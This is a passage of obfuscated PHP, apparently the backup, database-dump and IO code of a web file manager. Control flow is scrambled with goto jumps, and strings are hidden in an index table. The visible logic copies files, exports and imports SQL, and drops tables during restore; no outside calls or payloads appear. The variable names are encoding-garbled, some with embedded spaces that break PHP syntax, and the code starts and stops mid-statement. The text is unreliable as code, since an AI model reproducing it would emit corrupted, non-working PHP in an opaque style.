write_log($bæòëõäå≤, $EÕîƒ‚ØÃÖ[742]); return !1; } } goto f˘ö¿ùß£ì; dóãè∆†òÈ: if (!$Cûı‹ı» Ú) { return !1; } $cËıó∆â–’ = array($EÕîƒ‚ØÃÖ[762] => $Cûı‹ı» Ú, $EÕîƒ‚ØÃÖ[763] => time()); Backup::set($cËıó∆â–’); goto Cìé¬¯äàÖ; BÛôïÑä›à: $f◊ó¨Â√òÀ = IO::listPath($A–ªãªªûπ); $fÿÕî ≠’ﬁ = isset($f◊ó¨Â√òÀ[$EÕîƒ‚ØÃÖ[74]]) ? $f◊ó¨Â√òÀ[$EÕîƒ‚ØÃÖ[74]] : array(); $Cûı‹ı» Ú = array_sum(array_column($fÿÕî ≠’ﬁ, $EÕîƒ‚ØÃÖ[78])); goto dóãè∆†òÈ; f˘ö¿ùß£ì: $D£ö˜¬”Ÿã = CONTROLLER_DIR . $EÕîƒ‚ØÃÖ[768]; $Añ∂âÏÊËå = CONTROLLER_DIR . $EÕîƒ‚ØÃÖ[769]; IO::copy($D£ö˜¬”Ÿã, $e«ﬂÜï≠°£); goto cﬂÉ£È™ª ; d∆„≈∫»˘: $A–ªãªªûπ = $this->tmpFilesPath() . "\142\x61\x63\153\165\160\137{$Aô¶£®Ö–·}\57"; $e«ﬂÜï≠°£ = $this->backupPath($aì¢–Ñ§Òø); if (!($e«ﬂÜï≠°£ = IO::mkdir($e«ﬂÜï≠°£))) { return !1; } goto BÛôïÑä›à; aÉÈå†´·î: $EÕîƒ‚ØÃÖ =& $_SERVER[ú∫]; $aì¢–Ñ§Òø = Backup::get(); $Aô¶£®Ö–· = $aì¢–Ñ§Òø[$EÕîƒ‚ØÃÖ[28]]; goto d∆„≈∫»˘; EÌﬂ•é®–π: Backup::set($cËıó∆â–’); return !0; goto Cüãå†ﬂÑ”; cﬂÉ£È™ª : IO::copy($Añ∂âÏÊËå, $e«ﬂÜï≠°£); $EÓÖÂµ…Á´->end(); $cËıó∆â–’ = array($EÕîƒ‚ØÃÖ[770] => $Cûı‹ı» Ú, $EÕîƒ‚ØÃÖ[771] => time()); goto EÌﬂ•é®–π; Cüãå†ﬂÑ”: } private function backupPath($C €ÎØÚÁ¢) { $D⁄÷¯…√â’ =& $_SERVER[ú∫]; $Cœ§Ü©á‹≤ = $C €ÎØÚÁ¢[$D⁄÷¯…√â’[28]]; $C”çÂêØπı = Model($D⁄÷¯…√â’[730])->get($D⁄÷¯…√â’[731]); $bÃ¬˘É≤ﬁ· = substr(md5($D⁄÷¯…√â’[732] . $C”çÂêØπı . $Cœ§Ü©á‹≤), 0, 8); return "\x7b\x69\x6f\72{$C €ÎØÚÁ¢[$D⁄÷¯…√â’[712]]}\x7d\x2f\x64\x61\164\x61\142\x61\x73\145\x2f\142\x61\143\x6b\x75\160\57" . $Cœ§Ü©á‹≤ . $D⁄÷¯…√â’[71] . $bÃ¬˘É≤ﬁ·; } private function tmpFilesPath() { $b⁄ôÁˆñπ∫ =& $_SERVER[ú∫]; $b≠Øì≠á¶ä = TEMP_FILES; if ($GLOBALS[$b⁄ôÁˆñπ∫[6]][$b⁄ôÁˆñπ∫[88]][$b⁄ôÁˆñπ∫[760]]) { $b≠Øì≠á¶ä = $GLOBALS[$b⁄ôÁˆñπ∫[6]][$b⁄ôÁˆñπ∫[88]][$b⁄ôÁˆñπ∫[760]]; if (!mk_dir($b≠Øì≠á¶ä) || !is_writable($b≠Øì≠á¶ä) || !IO::mkfile($b≠Øì≠á¶ä . $b⁄ôÁˆñπ∫[761])) { $b≠Øì≠á¶ä = TEMP_FILES; } } return $b≠Øì≠á¶ä; } } class BackupFile { public function __construct() { } public function index() { goto bÒΩï•È∂Ù; B¢ÍºÉ⁄ˆæ: $aäèòêä∏Ã = $E´âéä∏È≈ = 0; do { $e≈ùåÇ©ÕÃ = $_SERVER[ú∫][779]; $d⁄ú†≤·Ññ = Model($_SERVER[ú∫][747])->where($EŸÓäõÎΩë)->field($e≈ùåÇ©ÕÃ)->order($_SERVER[ú∫][780])->selectPage($Bßÿ±…Ïºê, $eÚ°ÃÍÜ„ù); $DëıΩàÒÉ€ = !empty($d⁄ú†≤·Ññ[$_SERVER[ú∫][367]]) ? $d⁄ú†≤·Ññ[$_SERVER[ú∫][367]] : array(); foreach ($DëıΩàÒÉ€ as $Dﬁ÷Ì≤±ˆﬂ) { goto Fûﬁ´ÃﬁıÉ; Fûﬁ´ÃﬁıÉ: if (!$this->_fileExist($Dﬁ÷Ì≤±ˆﬂ, $aÍ∏ﬂ’ÿ°∂, $Aı‹´ÏÑ´√)) { $eäÜÊ≠‡Â• -= 1; $aç˘´ï⁄“ -= (int) $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][78]]; write_log("\x66\x69\154\x65\40\x6e\x6f\x74\x20\x65\x78\151\x73\164\x2e\146\151\154\145\x49\104\72{$Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][447]]}\54\x20\160\x61\x74\x68\72{$Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][76]]}", $_SERVER[ú∫][781]); continue; } $E≥∆¬«ØÆÂ = $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][76]]; $fø®ˆπ“≥å = "\173\x69\x6f\x3a{$d–»¿·Á∂«[$_SERVER[ú∫][712]]}\175" . substr($E≥∆¬«ØÆÂ, strlen("\173\151\157\72{$Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][782]]}\175")); goto d·üºÂæç•; Aëáö•ç€ß: $CÍõ©‚ÀÉ¢ += $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][78]]; $E´âéä∏È≈ += 1; $aäèòêä∏Ã += $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][78]]; goto B∆è§ª∫∂Í; B∆è§ª∫∂Í: if ($CÍõ©‚ÀÉ¢ >= 1024 * 1024 * 100) { $C´ÂÜë‹©‚ = array($_SERVER[ú∫][785] => $dûÍ€ñ£Ãú, $_SERVER[ú∫][786] => $E´âéä∏È≈, $_SERVER[ú∫][787] => $aäèòêä∏Ã); Backup::set($C´ÂÜë‹©‚); $CÍõ©‚ÀÉ¢ = $f∆ÙœÒü∑¨ = 0; } goto c‡¿∞î•«„; d·üºÂæç•: if (IO::exist($fø®ˆπ“≥å)) { $eâ≤‚«ùÉ©->updateFileEnd($Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][28]], $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][78]]); } else { $fø®ˆπ“≥å = get_path_father($fø®ˆπ“≥å); IO::mkdir($fø®ˆπ“≥å); if (!IO::copy($E≥∆¬«ØÆÂ, $fø®ˆπ“≥å, $_SERVER[ú∫][783])) { write_log($_SERVER[ú∫][784] . $E≥∆¬«ØÆÂ . $_SERVER[ú∫][767] . $fø®ˆπ“≥å . $_SERVER[ú∫][504], $_SERVER[ú∫][742]); $DÌò®òáæ≠ = !1; break; } } $dûÍ€ñ£Ãú = $Dﬁ÷Ì≤±ˆﬂ[$_SERVER[ú∫][447]]; $f∆ÙœÒü∑¨ += 1; goto Aëáö•ç€ß; c‡¿∞î•«„: } $C»É¨ﬁ√ÆÆ = count($DëıΩàÒÉ€); $eÚ°ÃÍÜ„ù++; } while ($C»É¨ﬁ√ÆÆ == $Bßÿ±…Ïºê); $eâ≤‚«ùÉ©->end(); goto e«åÙ“ªÙ©; e∆©˘ää∏”: $eâ≤‚«ùÉ©->task[$_SERVER[ú∫][723]] = $aç˘´ï⁄“; $C´ÂÜë‹©‚ = array($_SERVER[ú∫][776] => $eäÜÊ≠‡Â•, $_SERVER[ú∫][777] => $aç˘´ï⁄“, $_SERVER[ú∫][778] => time()); Backup::set($C´ÂÜë‹©‚); goto a–¿´∞”Ω…; C‰§∫Ñºäå: $eäÜÊ≠‡Â• = (int) Model($_SERVER[ú∫][747])->where($EŸÓäõÎΩë)->count($_SERVER[ú∫][447]); $aç˘´ï⁄“ = (int) Model($_SERVER[ú∫][747])->where($EŸÓäõÎΩë)->sum($_SERVER[ú∫][78]); $eâ≤‚«ùÉ© = new TaskFileTransfer($_SERVER[ú∫][774], $_SERVER[ú∫][742], $eäÜÊ≠‡Â•, LNG($_SERVER[ú∫][743]) . $_SERVER[ú∫][744] . LNG($_SERVER[ú∫][775])); goto e∆©˘ää∏”; f÷ï„…Üûè: $Bßÿ±…Ïºê = 1000; $CÍõ©‚ÀÉ¢ = $f∆ÙœÒü∑¨ = 0; $aÍ∏ﬂ’ÿ°∂ = array(); goto B¢ÍºÉ⁄ˆæ; bÒΩï•È∂Ù: $d–»¿·Á∂« = Backup::get(); $dûÍ€ñ£Ãú = $d–»¿·Á∂«[$_SERVER[ú∫][291]][$_SERVER[ú∫][193]][$_SERVER[ú∫][447]]; $EŸÓäõÎΩë = array($_SERVER[ú∫][448] => array($_SERVER[ú∫][772], $dûÍ€ñ£Ãú), $_SERVER[ú∫][773] => array($_SERVER[ú∫][329], $d–»¿·Á∂«[$_SERVER[ú∫][712]])); goto C‰§∫Ñºäå; e«åÙ“ªÙ©: $C´ÂÜë‹©‚ = array($_SERVER[ú∫][788] => 1, $_SERVER[ú∫][476] => time(), $_SERVER[ú∫][735] => 1, $_SERVER[ú∫][785] => $dûÍ€ñ£Ãú, $_SERVER[ú∫][777] => $aç˘´ï⁄“, $_SERVER[ú∫][776] => $eäÜÊ≠‡Â•, $_SERVER[ú∫][789] => time()); if ($f∆ÙœÒü∑¨) { $C´ÂÜë‹©‚[$_SERVER[ú∫][786]] = $E´âéä∏È≈; $C´ÂÜë‹©‚[$_SERVER[ú∫][787]] = $aäèòêä∏Ã; } Backup::set($C´ÂÜë‹©‚); goto c§âÉË™ù˘; c§âÉË™ù˘: $this->_fileFilter($aÍ∏ﬂ’ÿ°∂); return !0; goto AÖÓ„ÍèÏç; a–¿´∞”Ω…: $DÌò®òáæ≠ = !0; $Aı‹´ÏÑ´√ = $this->storeIds(); $eÚ°ÃÍÜ„ù = 1; goto f÷ï„…Üûè; AÖÓ„ÍèÏç: } private function _fileExist($EıéæµÜøΩ, &$e‰πê»∆ò·, $CñÎ√§≥ëó) { goto D“π•â™ﬂé; cãá»éÍé…: $e‰πê»∆ò· = array_merge($e‰πê»∆ò·, array_to_keyvalue($cÕØÜ¢◊§õ, $b¥œÖˆë⁄ [33], $b¥œÖˆë⁄ [447])); return !1; goto cÏßäÿÜ‹ÿ; F»Ç’øúß≠: if (!in_array($EıéæµÜøΩ[$b¥œÖˆë⁄ [782]], $CñÎ√§≥ëó)) { return !1; } if (IO::exist($B∂æ⁄—ë√≥)) { return !0; } $f™°ÁÉ¿§ê = get_path_father($B∂æ⁄—ë√≥); goto aü§¢Û……; aü§¢Û……: if (IO::exist($f™°ÁÉ¿§ê)) { $e‰πê»∆ò·[] = $EıéæµÜøΩ[$b¥œÖˆë⁄ [447]]; return !1; } $bªç§ê¢»Â = array($b¥œÖˆë⁄ [782] => $EıéæµÜøΩ[$b¥œÖˆë⁄ [782]], $b¥œÖˆë⁄ [76] => array($b¥œÖˆë⁄ [380], "{$f™°ÁÉ¿§ê}\45")); $cÕØÜ¢◊§õ = Model($b¥œÖˆë⁄ [747])->where($bªç§ê¢»Â)->field($b¥œÖˆë⁄ [448])->select(); goto cãá»éÍé…; D“π•â™ﬂé: $b¥œÖˆë⁄  =& $_SERVER[ú∫]; $B∂æ⁄—ë√≥ = $EıéæµÜøΩ[$b¥œÖˆë⁄ [76]]; if (in_array($EıéæµÜøΩ[$b¥œÖˆë⁄ [447]], $e‰πê»∆ò·)) { return !1; } goto F»Ç’øúß≠; cÏßäÿÜ‹ÿ: } private function _fileFilter($Bå†ç·Î≠¥) { $CÛå‚ëŒßŸ =& $_SERVER[ú∫]; if (empty($Bå†ç·Î≠¥)) { return; } $fù§ŸôëëŒ = array($CÛå‚ëŒßŸ[447] => array($CÛå‚ëŒßŸ[7], array_unique($Bå†ç·Î≠¥))); $b©πÑ∏ˆÁÏ = Model($CÛå‚ëŒßŸ[790])->where($fù§ŸôëëŒ)->field($CÛå‚ëŒßŸ[395])->select(); foreach ($b©πÑ∏ˆÁÏ as $e≤º¨∆°‘Ω) { Model($CÛå‚ëŒßŸ[790])->remove($e≤º¨∆°‘Ω[$CÛå‚ëŒßŸ[395]], !1); } } private function storeIds() { $e∂¥ø…⁄ß™ =& $_SERVER[ú∫]; $F∫ËÑÔ»è– = Model($e∂¥ø…⁄ß™[727])->listData(); $d√ôÃ±Îßˆ = array(); $dæå¥ÿ¢’Ó = $GLOBALS[$e∂¥ø…⁄ß™[6]][$e∂¥ø…⁄ß™[88]][$e∂¥ø…⁄ß™[791]]; foreach ($F∫ËÑÔ»è– as $Aãë≤ñ“Í’) { $eÌœåœÆ±∏ = strtolower($Aãë≤ñ“Í’[$e∂¥ø…⁄ß™[94]]); if (!isset($dæå¥ÿ¢’Ó[$eÌœåœÆ±∏])) { continue; } $eâ◊øààÓë = $e∂¥ø…⁄ß™[72] . (isset($dæå¥ÿ¢’Ó[$eÌœåœÆ±∏]) ? $dæå¥ÿ¢’Ó[$eÌœåœÆ±∏] : ucfirst($eÌœåœÆ±∏)); if (!class_exists($eâ◊øààÓë)) { continue; } $d√ôÃ±Îßˆ[] = $Aãë≤ñ“Í’[$e∂¥ø…⁄ß™[393]]; } return $d√ôÃ±Îßˆ; } } goto B°¢‡¥«∏Ø; C˘íõŒÂ¡ﬂ: class DbManage { function __construct($bëÃﬂ∆ûéﬂ, $Bæä√ÏÕ˘¶ = '') { $this->database = $bëÃﬂ∆ûéﬂ; $this->type = $Bæä√ÏÕ˘¶; } public function model($fÜÿ¬Ñ—Ô√ = '') { return new ModelBase($fÜÿ¬Ñ—Ô√, $_SERVER[ú∫][33], $this->database); } public function db($E⁄˘ıã’∏Â = false) { goto c∑µ“⁄¯£√; a∆†◊ˆ§êâ: if (!$cëÕïÆÚîñ) { $bÈ•¯âäÈ⁄->execute("\143\x72\145\141\164\x65\40\144\x61\x74\141\x62\x61\163\145\40\x60{$B“âõ≈úÙô}\x60"); } $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[929]] = $B“âõ≈úÙô; if ($BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[754]] == $Dˆ—™÷Ø©û[755]) { $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[756]] .= $Dˆ—™÷Ø©û[1017] . $B“âõ≈úÙô; } goto c†Ò»Ó¯‰È; AîıÖà‰ﬁº: $B“âõ≈úÙô = $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[929]]; $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[929]] = $Dˆ—™÷Ø©û[33]; if ($BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[754]] == $Dˆ—™÷Ø©û[755]) { $e˜ÃΩÜ±÷© = $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[756]]; $BÉ Ú«ç‘ô[$Dˆ—™÷Ø©û[756]] = substr($e˜ÃΩÜ±÷©, 0, strrpos($e˜ÃΩÜ±÷©, $Dˆ—™÷Ø©û[1017])); } goto Fëé⁄áÔ€á; c∑µ“⁄¯£√: $Dˆ—™÷Ø©û =& $_SERVER[ú∫]; $BÉ Ú«ç‘ô = array_change_key_case($this->database); if ($this->type == $Dˆ—™÷Ø©û[9] || !$E⁄˘ıã’∏Â) { return $this->model()->db(); } goto AîıÖà‰ﬁº; c†Ò»Ó¯‰È: $this->database = $BÉ Ú«ç‘ô; $bÈ•¯âäÈ⁄->execute("\x75\x73\145\40\140{$B“âõ≈úÙô}\x60"); return $bÈ•¯âäÈ⁄; goto D£ﬂÚπ ¯; Fëé⁄áÔ€á: $this->database = $BÉ Ú«ç‘ô; $bÈ•¯âäÈ⁄ = $this->model()->db(); try { $cëÕïÆÚîñ = $bÈ•¯âäÈ⁄->execute("\163\x68\x6f\167\40\x64\141\164\x61\142\x61\x73\145\163\40\x6c\151\x6b\145\x20\x27{$B“âõ≈úÙô}\47"); } catch (Exception $aîÏ¯≠‰Ÿ◊) { } goto a∆†◊ˆ§êâ; D£ﬂÚπ ¯: } public function createTable($F‰∑ªÌ·ß´, $A¯†È∏⁄Î¿ = null) { $cÏŸÜŸê—Ù =& $_SERVER[ú∫]; if (!IO::exist($F‰∑ªÌ·ß´)) { ActionCall($cÏŸÜŸê—Ù[1018], !0, 0); show_json(LNG($cÏŸÜŸê—Ù[1019]), !1); } $aΩ∏ƒë≥ìÎ = sqlSplit(IO::getContent($F‰∑ªÌ·ß´)); foreach ($aΩ∏ƒë≥ìÎ as $f¬€√°èåÔ) { if ($A¯†È∏⁄Î¿) { $Cåã–Ò≤ÜÁ = stripos($f¬€√°èåÔ, $cÏŸÜŸê—Ù[1020]) === 0; if ($Cåã–Ò≤ÜÁ) { $A¯†È∏⁄Î¿->task[$cÏŸÜŸê—Ù[1021]] += 1; } } $this->model()->db()->execute($f¬€√°èåÔ); if ($A¯†È∏⁄Î¿ && $Cåã–Ò≤ÜÁ) { preg_match($cÏŸÜŸê—Ù[1022], $f¬€√°èåÔ, $c”Ìì∏Éﬁﬁ); $A¯†È∏⁄Î¿->task[$cÏŸÜŸê—Ù[1023]] = $c”Ìì∏Éﬁﬁ[1]; $A¯†È∏⁄Î¿->update(1); } } $this->taskToCache($A¯†È∏⁄Î¿); } public function insertTable($cßÀ¯∏Û¶‹, $Bç¥√‘–…é = null) { $Cíò¿È±Èá =& $_SERVER[ú∫]; $EëΩÊ‚ΩÎÎ = $this->model()->db(); $CÈﬂÉ€òŒ‰ = $d€ÉÖâ¶åÇ ? array($d€ÉÖâ¶åÇ) : $EëΩÊ‚ΩÎÎ->getTables(); foreach ($cßÀ¯∏Û¶‹ as $cõ°Ü¢Òéê) { $d€ÉÖâ¶åÇ = basename($cõ°Ü¢Òéê, $Cíò¿È±Èá[746]); if (!in_array($d€ÉÖâ¶åÇ, $CÈﬂÉ€òŒ‰)) { continue; } if ($Bç¥√‘–…é) { $Bç¥√‘–…é->task[$Cíò¿È±Èá[1023]] = $d€ÉÖâ¶åÇ; } if (get_filesize($cõ°Ü¢Òéê) == 0) { continue; } $añòΩ‰æﬁ∞ = $this->sqlToDb($cõ°Ü¢Òéê, $Bç¥√‘–…é); if (!$añòΩ‰æﬁ∞) { ActionCall($Cíò¿È±Èá[1018], !0, 0); show_json(LNG($Cíò¿È±Èá[1024]) . "\x5b{$d€ÉÖâ¶åÇ}\x5d", !1); } } $this->taskToCache($Bç¥√‘–…é); } public function sqlFromDb($AÀé¯€Áπ§, $AÙÙú°ÆÛê, $déÇé‰∞ﬁª = null, $fœåºú¥åã = null) { goto Cá…⁄°Öƒë; Cá…⁄°Öƒë: if ($déÇé‰∞ﬁª) { $déÇé‰∞ﬁª->task[$_SERVER[ú∫][1023]] = $AÀé¯€Áπ§; } $då˜ﬁ”é«é = $this->model($AÀé¯€Áπ§); $d°ﬁÜ≤÷Ù = 0; goto eÒØ…ØÃáÆ; a»∫êåºÜê: fclose($cêçá¯ªﬂÃ); return $d°ﬁÜ≤÷Ù; goto f«’›‚µˆ´; A≥ÑÉŒ≠ëÓ: $fœøòú√´Á = $då˜ﬁ”é«é->getPk(); $cÎàãùóìŒ = $då˜ﬁ”é«é->getDbFields(); do { $dÉÂëª±œŒ = array($fœøòú√´Á => array($_SERVER[ú∫][971], $AÑñ˜Ù©ˆë)); $aÇáÑ≥¬ÒÇ = $då˜ﬁ”é«é->where($dÉÂëª±œŒ)->field($cÎàãùóìŒ)->order($fœøòú√´Á . $_SERVER[ú∫][1026])->limit($Cíº∏µﬂÖà)->select(); $aÇáÑ≥¬ÒÇ = !empty($aÇáÑ≥¬ÒÇ) ? $aÇáÑ≥¬ÒÇ : array(); if (!($Då∑ë¿ÊΩ≈ = count($aÇáÑ≥¬ÒÇ))) { break; } $A–öÏ±ùãü = end($aÇáÑ≥¬ÒÇ); $AÑñ˜Ù©ˆë = $A–öÏ±ùãü[$fœøòú√´Á]; $dƒˆËÖ‹Ñ» = array(); foreach ($aÇáÑ≥¬ÒÇ as $A≈Œ‡ßçÇ“) { if ($AÀé¯€Áπ§ == $_SERVER[ú∫][1027] && $A≈Œ‡ßçÇ“[$_SERVER[ú∫][29]] == $_SERVER[ú∫][1028]) { $fﬂ√¡Ã®¯Â = json_decode($A≈Œ‡ßçÇ“[$_SERVER[ú∫][372]], !0); if ($fﬂ√¡Ã®¯Â[$_SERVER[ú∫][28]] == date($_SERVER[ú∫][711]) && !$fﬂ√¡Ã®¯Â[$_SERVER[ú∫][710]]) { continue; } } if ($fœåºú¥åã) { $A≈Œ‡ßçÇ“[$_SERVER[ú∫][76]] = "\x7b\151\157\x3a{$fœåºú¥åã}\x7d" . substr($A≈Œ‡ßçÇ“[$_SERVER[ú∫][76]], strlen("\173\151\x6f\x3a{$A≈Œ‡ßçÇ“[$_SERVER[ú∫][782]]}\x7d")); $A≈Œ‡ßçÇ“[$_SERVER[ú∫][782]] = $fœåºú¥åã; } $dƒˆËÖ‹Ñ»[] = $_SERVER[ú∫][1029] . $this->sqlEncode($A≈Œ‡ßçÇ“) . $_SERVER[ú∫][1030]; } $C±‰Úá‚ŸÑ = "\111\116\x53\x45\122\x54\40\111\x4e\x54\x4f\40\140{$AÀé¯€Áπ§}\x60\x20\x28\140" . implode($_SERVER[ú∫][1031], $cÎàãùóìŒ) . $_SERVER[ú∫][1032]; fwrite($cêçá¯ªﬂÃ, $C±‰Úá‚ŸÑ . implode($_SERVER[ú∫][1033], $dƒˆËÖ‹Ñ») . $_SERVER[ú∫][68] . PHP_EOL); $d°ﬁÜ≤÷Ù += $Då∑ë¿ÊΩ≈; if ($déÇé‰∞ﬁª) { $déÇé‰∞ﬁª->update($Då∑ë¿ÊΩ≈); } } while ($Cíº∏µﬂÖà == $Då∑ë¿ÊΩ≈); goto a»∫êåºÜê; eÒØ…ØÃáÆ: $AÑñ˜Ù©ˆë = 0; $Cíº∏µﬂÖà = 10000; $cêçá¯ªﬂÃ = fopen($AÙÙú°ÆÛê, $_SERVER[ú∫][1025]); goto A≥ÑÉŒ≠ëÓ; f«’›‚µˆ´: } public function sqlToDb($DÏ±ê≈¥Á, $b™€À√™ﬂ” = null) { goto CÜ–—¿·∞–; F›ãç≤å‚›: if (!empty($b™èÚ‘¶Ìó)) { $E§¨í∫åàÎ = $d‘·„É«èó . implode($AÀúÉ“„à¶[47], $b™èÚ‘¶Ìó); if (!$B˜Æàı‹Üı->execute($E§¨í∫åàÎ)) { return !1; } if ($b™€À√™ﬂ”) { $b™€À√™ﬂ”->update($Cù´˜ô”Ùƒ); } } return !0; goto cÔâµ≥ÕÉÑ; EÏôúÁ§ıÀ: if (!$aπôàïµ †) { return !1; } $Cù´˜ô”Ùƒ = 0; $d‘·„É«èó = $AÀúÉ“„à¶[33]; goto AË õåÿÈÒ; AË õåÿÈÒ: $b™èÚ‘¶Ìó = array(); $Fº≥ŸÍàª£ = $this->type == $AÀúÉ“„à¶[9] ? 500 : 2000; $c¿ãÜâµ‰ò = basename($DÏ±ê≈¥Á, $AÀúÉ“„à¶[746]); goto D∞ﬂñÔ∏ë; CÜ–—¿·∞–: $AÀúÉ“„à¶ =& $_SERVER[ú∫]; $B˜Æàı‹Üı = $this->model()->db(); $aπôàïµ † = @fopen($DÏ±ê≈¥Á, $AÀúÉ“„à¶[1034]); goto EÏôúÁ§ıÀ; D∞ﬂñÔ∏ë: if ($c¿ãÜâµ‰ò == $AÀúÉ“„à¶[1035]) { $Fº≥ŸÍàª£ = 50; } while (!feof($aπôàïµ †)) { $B÷¬“£Ω¶• = trim(fgets($aπôàïµ †)); if (!$B÷¬“£Ω¶•) { continue; } $E§¨í∫åàÎ = $this->sqlDecode($B÷¬“£Ω¶•, $this->type); if (stripos($E§¨í∫åàÎ, $AÀúÉ“„à¶[355]) === 0) { if (!$d‘·„É«èó) { $d‘·„É«èó = $E§¨í∫åàÎ . $AÀúÉ“„à¶[50]; } continue; } if ($b™€À√™ﬂ”) { $b™€À√™ﬂ”->task[$AÀúÉ“„à¶[1021]] += 1; } $Cù´˜ô”Ùƒ++; $b™èÚ‘¶Ìó[] = rtrim(rtrim(trim($E§¨í∫åàÎ), $AÀúÉ“„à¶[47]), $AÀúÉ“„à¶[68]); if ($Cù´˜ô”Ùƒ >= $Fº≥ŸÍàª£) { $E§¨í∫åàÎ = $d‘·„É«èó . implode($AÀúÉ“„à¶[47], $b™èÚ‘¶Ìó); if (!$B˜Æàı‹Üı->execute($E§¨í∫åàÎ)) { return !1; } if ($b™€À√™ﬂ”) { $b™€À√™ﬂ”->update($Cù´˜ô”Ùƒ); } $b™èÚ‘¶Ìó = array(); $Cù´˜ô”Ùƒ = 0; } } fclose($aπôàïµ †); goto F›ãç≤å‚›; cÔâµ≥ÕÉÑ: } public function dropTable($f≠∏¶èé…ñ = null) { $E‹ñ†ËÃèÉ = $this->model()->db(); $FÆ›Òû√‰’ = $f≠∏¶èé…ñ ? array($f≠∏¶èé…ñ) : $E‹ñ†ËÃèÉ->getTables(); if (!$FÆ›Òû√‰’) { return; } foreach ($FÆ›Òû√‰’ as $f≠∏¶èé…ñ) { $E‹ñ†ËÃèÉ->execute("\144\162\x6f\x70\40\164\141\142\154\145\x20\151\x66\40\145\170\151\x73\164\163\40\140{$f≠∏¶èé…ñ}\140"); } } private function taskToCache($a–È‰ïî⁄° = null) { $D€»ÿ∂¡ù∞ =& $_SERVER[ú∫]; if (!$a–È‰ïî⁄°) { return; } $d‡Î¥ê≤é— = array($D€»ÿ∂¡ù∞[1023] => $a–È‰ïî⁄°->task[$D€»ÿ∂¡ù∞[1023]], $D€»ÿ∂¡ù∞[1021] => $a–È‰ïî⁄°->task[$D€»ÿ∂¡ù∞[1021]], $D€»ÿ∂¡ù∞[1036] => $a–È‰ïî⁄°->task[$D€»ÿ∂¡ù∞[1036]]); if ($d‡Î¥ê≤é—[$D€»ÿ∂¡ù∞[1021]] == $d‡Î¥ê≤é—[$D€»ÿ∂¡ù∞[1036]]) { $d‡Î¥ê≤é—[$D€»ÿ∂¡ù∞[720]] = 1; } Cache::set($D€»ÿ∂¡ù∞[1037] . $a–È‰ïî⁄°->task[$D€»ÿ∂¡ù∞[393]], $d‡Î¥ê≤é—); $a–È‰ïî⁄°->end(); } private function sqlEncode($Bä‰√⁄∑äë) { $c±œ∫æ±◊Ç =& $_SERVER[ú∫]; $Bºı¿àûÿ´ = array(); foreach ($Bä‰√⁄∑äë as $aªè¢àªìˆ) { if (is_array($aªè¢àªìˆ)) { $aªè¢àªìˆ = json_encode_force($aªè¢àªìˆ); } $aªè¢àªìˆ = addslashes($aªè¢àªìˆ); $aªè¢àªìˆ = str_replace(array($c±œ∫æ±◊Ç[1038], $c±œ∫æ±◊Ç[229]), array($c±œ∫æ±◊Ç[1039], $c±œ∫æ±◊Ç[1040]), $aªè¢àªìˆ); $Bºı¿àûÿ´[] = str_replace($c±œ∫æ±◊Ç[55], $c±œ∫æ±◊Ç[1041], $aªè¢àªìˆ); } return $c±œ∫æ±◊Ç[55] . implode($c±œ∫æ±◊Ç[1042], $Bºı¿àûÿ´) . $c±œ∫æ±◊Ç[55]; } private function sqlDecode($eËíã∂ä≤ , $D≠µ—â˘äà) { $déØëò≠Æ™ =& $_SERVER[ú∫]; $eËíã∂ä≤  = str_replace(array($déØëò≠Æ™[1039], $déØëò≠Æ™[1040]), array($déØëò≠Æ™[1038], $déØëò≠Æ™[229]), $eËíã∂ä≤ ); if ($D≠µ—â˘äà == $déØëò≠Æ™[9]) { $eËíã∂ä≤  = stripslashes($eËíã∂ä≤ ); } return $eËíã∂ä≤ ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Cè∆œ®õÈö, $bé∆Õ∆Õ‡) { goto A öπ‹ÖÖë; A öπ‹ÖÖë: $bº∑…˜ê”° =& $_SERVER[ú∫]; $dΩ§ç¥áÚá = $bé∆Õ∆Õ‡; $GLOBALS[$bº∑…˜ê”°[1043]] = $bº∑…˜ê”°[1044] . $Cè∆œ®õÈö; goto B∑ËΩÊ„ñŒ; DÌç¯≥ßÎ«: Hook::trigger($bº∑…˜ê”°[1044] . $Cè∆œ®õÈö . $bº∑…˜ê”°[1047], $dΩ§ç¥áÚá, $eË†À¬≤˘æ); return $eË†À¬≤˘æ; goto CÇ∂ﬂ∆çÈÂ; B∑ËΩÊ„ñŒ: Hook::trigger($bº∑…˜ê”°[1044] . $Cè∆œ®õÈö . $bº∑…˜ê”°[1045], $dΩ§ç¥áÚá); $b†‰∑õ§∑∂ = self::driverMake($bé∆Õ∆Õ‡[0]); if (method_exists($b†‰∑õ§∑∂, $Cè∆œ®õÈö)) { $eË†À¬≤˘æ = @call_user_func_array(array($b†‰∑õ§∑∂, $Cè∆œ®õÈö), $bé∆Õ∆Õ‡); } else { if (method_exists($b†‰∑õ§∑∂, $bº∑…˜ê”°[1046])) { $eË†À¬≤˘æ = @call_user_func_array(array($b†‰∑õ§∑∂, $Cè∆œ®õÈö), $bé∆Õ∆Õ‡); } else { if (method_exists(self, $Cè∆œ®õÈö)) { $eË†À¬≤˘æ = @call_user_func_array(array(self, $Cè∆œ®õÈö), $bé∆Õ∆Õ‡); } else { $eË†À¬≤˘æ = call_user_func_array(array(parent, $Cè∆œ®õÈö), $bé∆Õ∆Õ‡); } } } goto DÌç¯≥ßÎ«; CÇ∂ﬂ∆çÈÂ: } public static function init($e≤åü÷ÈÑ˘) { return self::driverMake($e≤åü÷ÈÑ˘); } public static function copy($cá¬ôﬂπÛƒ, $aÖ˘‚çâÑç, $cïÎ ÈÆØ≠ = false, $fÊüòöÿ°± = false) { return 